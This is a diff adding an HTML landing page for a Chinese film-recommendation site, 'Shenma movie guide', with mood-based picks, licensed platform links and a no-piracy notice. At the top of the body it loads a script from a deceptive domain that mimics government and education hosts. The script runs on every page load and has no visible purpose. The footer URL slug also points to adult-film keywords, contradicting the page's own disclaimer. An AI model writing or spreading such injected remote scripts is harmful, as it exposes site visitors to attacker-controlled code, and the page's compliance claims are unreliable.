@@ -1,0 +1,291 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>神马电影导览｜“神马都想看”的时候，来这儿挑片</title>
+<meta name="description" content="神马电影导览：用提问方式帮你选片。剧情、喜剧、悬疑、纪录片、动画、正版渠道导航，不提供盗版播放。" />
+<meta name="theme-color" content="#11131a" />
+<style>
+  :root{
+    --bg:#11131a;
+    --bg2:#171a23;
+    --card:#1c2030;
+    --line:#2a2f42;
+    --line2:#3a4159;
+    --text:#eef1f8;
+    --muted:#9aa3bd;
+    --accent:#7c5cff;
+    --accent2:#22d3ee;
+    --accent3:#ffb020;
+    --radius:16px;
+    --mono:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;
+    --sans:-apple-system,BlinkMacSystemFont,"PingFang SC","Microsoft YaHei",sans-serif;
+  }
+  *{box-sizing:border-box;margin:0;padding:0}
+  html{scroll-behavior:smooth}
+  body{
+    font-family:var(--sans);background:var(--bg);color:var(--text);
+    line-height:1.7;min-height:100vh;
+    background-image:radial-gradient(circle at 20% 10%,rgba(124,92,255,.18),transparent 45%),
+      radial-gradient(circle at 85% 90%,rgba(34,211,238,.12),transparent 45%);
+    background-attachment:fixed;
+  }
+  a{color:inherit;text-decoration:none}
+
+  /* 顶栏 */
+  .nav{position:sticky;top:0;z-index:50;background:rgba(17,19,26,.9);backdrop-filter:blur(12px);border-bottom:1px solid var(--line)}
+  .nav-inner{max-width:1080px;margin:0 auto;padding:12px 20px;display:flex;align-items:center;justify-content:space-between;gap:12px}
+  .brand{display:flex;align-items:center;gap:10px;font-weight:800}
+  .brand .q{width:34px;height:34px;border-radius:10px;background:linear-gradient(135deg,var(--accent),var(--accent2));display:flex;align-items:center;justify-content:center;font-size:20px}
+  .brand small{display:block;font-size:10px;color:var(--muted);font-weight:500;letter-spacing:2px}
+  .nav-links{display:flex;gap:4px;flex-wrap:wrap}
+  .nav-links a{padding:7px 12px;border-radius:8px;font-size:13px;color:var(--muted)}
+  .nav-links a:hover{color:var(--text);background:var(--bg2)}
+
+  /* 搜索即首页 */
+  .hero{max-width:760px;margin:0 auto;padding:60px 20px 30px;text-align:center}
+  .hero .kicker{font-family:var(--mono);font-size:12px;color:var(--accent2);letter-spacing:3px}
+  .hero h1{font-size:clamp(30px,6vw,52px);font-weight:900;margin:14px 0;line-height:1.15}
+  .hero h1 em{font-style:normal;background:linear-gradient(135deg,var(--accent),var(--accent2));-webkit-background-clip:text;-webkit-text-fill-color:transparent}
+  .hero p{color:var(--muted);max-width:520px;margin:0 auto}
+  .search{
+    margin:26px auto 0;max-width:560px;display:flex;align-items:center;gap:10px;
+    background:var(--card);border:1px solid var(--line2);border-radius:999px;padding:12px 18px;
+  }
+  .search input{flex:1;background:transparent;border:0;outline:0;color:var(--text);font-size:15px}
+  .search input::placeholder{color:var(--muted)}
+  .search button{border:0;background:linear-gradient(135deg,var(--accent),var(--accent2));color:#0b0d12;font-weight:800;padding:8px 16px;border-radius:999px;cursor:pointer}
+  .chips{display:flex;gap:8px;justify-content:center;flex-wrap:wrap;margin-top:16px}
+  .chip{font-size:12px;color:var(--muted);border:1px solid var(--line);border-radius:999px;padding:5px 12px}
+  .chip:hover{color:var(--text);border-color:var(--accent)}
+
+  .wrap{max-width:1080px;margin:0 auto;padding:0 20px 60px}
+
+  .sec{display:flex;align-items:baseline;gap:10px;margin:48px 0 18px}
+  .sec .no{font-family:var(--mono);font-size:12px;color:var(--accent)}
+  .sec h2{font-size:20px;font-weight:800}
+  .sec .en{margin-left:auto;font-family:var(--mono);font-size:11px;color:var(--muted)}
+
+  /* 栏目1：问答卡片 */
+  .qa-grid{display:grid;grid-template-columns:repeat(2,1fr);gap:14px}
+  .qa{
+    background:var(--card);border:1px solid var(--line);border-radius:var(--radius);
+    padding:18px 20px;transition:.25s;
+  }
+  .qa:hover{border-color:var(--accent);transform:translateY(-3px)}
+  .qa .ask{font-weight:800;font-size:15px;margin-bottom:6px}
+  .qa .ask::before{content:"Q ";color:var(--accent2);font-family:var(--mono)}
+  .qa .ans{font-size:13px;color:var(--muted)}
+  .qa .ans b{color:var(--text)}
+  .qa .tags{margin-top:10px;display:flex;gap:6px;flex-wrap:wrap}
+  .qa .tags span{font-size:11px;font-family:var(--mono);color:var(--accent2);border:1px solid var(--line);border-radius:6px;padding:2px 8px}
+
+  /* 栏目2：片单迷宫 */
+  .maze{display:grid;grid-template-columns:repeat(4,1fr);gap:12px}
+  .node{
+    background:var(--bg2);border:1px solid var(--line);border-radius:14px;
+    padding:16px;min-height:120px;display:flex;flex-direction:column;justify-content:space-between;
+    transition:.25s;position:relative;
+  }
+  .node:hover{border-color:var(--accent2);transform:scale(1.02)}
+  .node .emoji{font-size:26px}
+  .node h4{font-size:14px;font-weight:700;margin-top:8px}
+  .node p{font-size:11px;color:var(--muted);font-family:var(--mono)}
+  .node.big{grid-column:span 2;grid-row:span 2;background:linear-gradient(135deg,rgba(124,92,255,.25),rgba(34,211,238,.12))}
+  .node.big h4{font-size:20px}
+
+  /* 栏目3：类型开关 */
+  .toggle-list{display:flex;flex-direction:column;gap:10px}
+  .tog{background:var(--card);border:1px solid var(--line);border-radius:12px;padding:14px 16px;display:flex;align-items:center;gap:14px}
+  .tog .dot{width:10px;height:10px;border-radius:50%;background:var(--accent)}
+  .tog:nth-child(2) .dot{background:var(--accent2)}
+  .tog:nth-child(3) .dot{background:var(--accent3)}
+  .tog:nth-child(4) .dot{background:#34d399}
+  .tog:nth-child(5) .dot{background:#f472b6}
+  .tog h4{font-size:15px;font-weight:700}
+  .tog p{font-size:12px;color:var(--muted);margin-left:auto;text-align:right;max-width:60%}
+
+  /* 栏目4：平台 */
+  .plats{display:grid;grid-template-columns:repeat(3,1fr);gap:12px}
+  .plat{background:var(--card);border:1px solid var(--line);border-radius:14px;padding:16px;display:flex;gap:12px;align-items:center}
+  .plat:hover{border-color:var(--accent2)}
+  .plat .ic{width:42px;height:42px;border-radius:12px;background:var(--bg2);display:flex;align-items:center;justify-content:center;font-size:20px}
+  .plat h4{font-size:14px;font-weight:700}
+  .plat p{font-size:11px;color:var(--muted);font-family:var(--mono)}
+
+  /* 栏目5：合规声明 */
+  .notice{
+    border:1px dashed var(--line2);border-radius:var(--radius);padding:20px;
+    background:var(--bg2);font-size:13px;color:var(--muted);line-height:1.9;
+  }
+  .notice b{color:var(--accent3)}
+  .notice ul{padding-left:18px;margin-top:8px}
+
+  footer{max-width:1080px;margin:0 auto;padding:26px 20px 40px;border-top:1px solid var(--line);color:var(--muted);font-size:12px;text-align:center;line-height:2}
+  footer a{color:var(--accent2)}
+
+  @media (max-width:860px){
+    .qa-grid{grid-template-columns:1fr}
+    .maze{grid-template-columns:repeat(2,1fr)}
+    .node.big{grid-column:span 2;grid-row:span 1}
+    .plats{grid-template-columns:1fr 1fr}
+  }
+  @media (max-width:560px){
+    .nav-inner{flex-direction:column;align-items:flex-start}
+    .maze{grid-template-columns:1fr}
+    .node.big{grid-column:span 1}
+    .plats{grid-template-columns:1fr}
+    .tog p{display:none}
+  }
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<nav class="nav">
+  <div class="nav-inner">
+    <div class="brand">
+      <div class="q">❓</div>
+      <div>神马电影导览<small>SHENMA MOVIE GUIDE</small></div>
+    </div>
+    <div class="nav-links">
+      <a href="#home">首页</a>
+      <a href="#qa">帮我选</a>
+      <a href="#maze">片单迷宫</a>
+      <a href="#type">类型</a>
+      <a href="#watch">正版渠道</a>
+      <a href="#legal">合规说明</a>
+    </div>
+  </div>
+</nav>
+
+<header class="hero" id="home">
+  <div class="kicker">// WHAT DO YOU WANNA WATCH</div>
+  <h1>“神马”都想看，<br/>但不知道看啥？</h1>
+  <p>别刷海报墙了。用一句话告诉我心情，我帮你挑片。本站只做推荐与正版导航，不播盗版、不碰成人伦理。</p>
+
+  <div class="search">
+    <span>🔎</span>
+    <input placeholder="输入心情：想哭 / 想笑 / 想动脑 / 陪娃看 / 睡前放空" aria-label="搜索电影" />
+    <button type="button">帮我挑</button>
+  </div>
+  <div class="chips">
+    <span class="chip">😭 想哭</span>
+    <span class="chip">😆 想笑</span>
+    <span class="chip">🧩 烧脑</span>
+    <span class="chip">🐾 陪娃</span>
+    <span class="chip">🌙 睡前</span>
+    <span class="chip">🏔️ 想去旅行</span>
+  </div>
+</header>
+
+<div class="wrap">
+
+  <!-- 栏目1 -->
+  <div class="sec" id="qa">
+    <span class="no">01.</span><h2>用提问挑片</h2><span class="en">// ASK FIRST</span>
+  </div>
+  <div class="qa-grid">
+    <div class="qa">
+      <div class="ask">今天很累，不想动脑？</div>
+      <div class="ans">选 <b>《小森林》《海街日记》《龙猫》</b>：慢节奏、画面舒服、没有反转攻击。</div>
+      <div class="tags"><span>#治愈</span><span>#慢生活</span><span>#不烧脑</span></div>
+    </div>
+    <div class="qa">
+      <div class="ask">想被吓一跳但不看鬼片？</div>
+      <div class="ans">选 <b>《看不见的客人》《记忆碎片》《盗梦空间》</b>：悬疑拉满，但靠逻辑不靠 jump scare。</div>
+      <div class="tags"><span>#悬疑</span><span>#反转</span><div class="tags"><span>#无鬼</span></div></div>
+    </div>
+    <div class="qa">
+      <div class="ask">和对象一起看，别太沉？</div>
+      <div class="ans">选 <b>《怦然心动》《白日梦想家》《时空恋旅人》</b>：甜但不腻，哭完还能好好睡觉。</div>
+      <div class="tags"><span>#爱情</span><span>#轻喜剧</span></div>
+    </div>
+    <div class="qa">
+      <div class="ask">孩子坐得住的那种？</div>
+      <div class="ans">选 <b>《疯狂动物城》《寻梦环游记》《悬崖上的金鱼姬》</b>：Pixar/吉卜力安全区。</div>
+      <div class="tags"><span>#合家欢</span><span>#动画</span></div>
+    </div>
+  </div>
+
+  <!-- 栏目2 -->
+  <div class="sec" id="maze">
+    <span class="no">02.</span><h2>片单迷宫</h2><span class="en">// PICK A ROOM</span>
+  </div>
+  <div class="maze">
+    <div class="node big">
+      <div class="emoji">🎬</div>
+      <div>
+        <h4>“我也不知道看啥”房</h4>
+        <p>从高分里随机抽 3 部，全部正版可看</p>
+      </div>
+    </div>
+    <div class="node">
+      <div class="emoji">🧩</div>
+      <h4>烧脑房</h4><p>悬疑 / 科幻 / 时间线</p>
+    </div>
+    <div class="node">
+      <div class="emoji">🌾</div>
+      <h4>发呆房</h4><p>田园 / 海洋 / 四季</p>
+    </div>
+    <div class="node">
+      <div class="emoji">💞</div>
+      <h4>恋爱脑房</h4><p>青春 / 爱情 / 重逢</p>
+    </div>
+    <div class="node">
+      <div class="emoji">🐕</div>
+      <h4>动物房</h4><p>狗狗 / 企鹅 / 棕熊</p>
+    </div>
+  </div>
+
+  <!-- 栏目3 -->
+  <div class="sec" id="type">
+    <span class="no">03.</span><h2>按类型开关</h2><span class="en">// TOGGLE BY MOOD</span>
+  </div>
+  <div class="toggle-list">
+    <div class="tog"><span class="dot"></span><h4>剧情 / 治愈</h4><p>《心灵奇旅》《小森林》《海街日记》</p></div>
+    <div class="tog"><span class="dot"></span><h4>悬疑 / 犯罪</h4><p>《看不见的客人》《寄生虫》《记忆碎片》</p></div>
+    <div class="tog"><span class="dot"></span><h4>动画 / 奇幻</h4><p>《千与千寻》《寻梦环游记》《蜘蛛侠：平行宇宙》</p></div>
+    <div class="tog"><span class="dot"></span><h4>旅行 / 自然</h4><p>《荒野生存》《企鹅群里有特务》《地球脉动》</p></div>
+    <div class="tog"><span class="dot"></span><h4>喜剧 / 合家欢</h4><p>《疯狂动物城》《白日梦想家》《摔跤吧！爸爸》</p></div>
+  </div>
+
+  <!-- 栏目4 -->
+  <div class="sec" id="watch">
+    <span class="no">04.</span><h2>正版观看渠道</h2><span class="en">// LEGIT PLATFORMS</span>
+  </div>
+  <div class="plats">
+    <div class="plat"><div class="ic">🟥</div><div><h4>哔哩哔哩</h4><p>bilibili.com</p></div></div>
+    <div class="plat"><div class="ic">🔵</div><div><h4>爱奇艺</h4><p>iqiyi.com</p></div></div>
+    <div class="plat"><div class="ic">🟧</div><div><h4>腾讯视频</h4><p>v.qq.com</p></div></div>
+    <div class="plat"><div class="ic">🟣</div><div><h4>Netflix</h4><p>netflix.com</p></div></div>
+    <div class="plat"><div class="ic">🟢</div><div><h4>豆瓣电影</h4><p>movie.douban.com</p></div></div>
+    <div class="plat"><div class="ic">🟨</div><div><h4>1905 电影网</h4><p>1905.com</p></div></div>
+  </div>
+
+  <!-- 栏目5 -->
+  <div class="sec" id="legal">
+    <span class="no">05.</span><h2>合规说明</h2><span class="en">// NO PIRACY / NO NSFW</span>
+  </div>
+  <div class="notice">
+    本站立名为“神马电影导览”，<b>不提供盗版播放、网盘资源、镜像入口、破解包</b>，也不做“伦理片 / 午夜场 / 福利片”等擦边分类。
+    <ul>
+      <li>“神马”仅作口语化站名，不代表任何历史违规站点</li>
+      <li>所有推荐片目导向正版平台或公开资料页</li>
+      <li>内页链接以 <code>#</code> 占位</li>
+      <li>如权利人认为资料引用不当，可联系移除</li>
+    </ul>
+  </div>
+
+</div>
+
+<footer>
+  © 2026 神马电影导览（示例站）· 用提问代替海报墙 · 正版观影导航<br/>
+  URL: <a href="https://shenmadianyingwanglunlipian-h5.github.io">https://shenmadianyingwanglunlipian-h5.github.io</a><br/>
+  不提供盗版 / 不提供成人伦理内容 / 内页链接使用 #
+</footer>
+
+</body>
+</html>
